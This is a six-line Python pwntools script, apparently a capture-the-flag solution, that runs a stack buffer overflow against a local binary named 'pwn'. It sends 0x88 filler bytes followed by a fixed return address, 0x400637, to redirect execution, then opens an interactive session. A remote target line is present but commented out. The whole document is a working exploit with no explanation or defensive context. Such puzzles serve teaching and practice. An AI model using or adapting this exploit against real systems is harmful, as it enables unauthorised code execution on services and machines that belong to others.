from pwn import *
p = process("./pwn")
# p = remote("111.231.70.44",28049)
payload = b"A"*(0x80+8) + p64(0x0400637)
p.send(payload)
p.interactive()
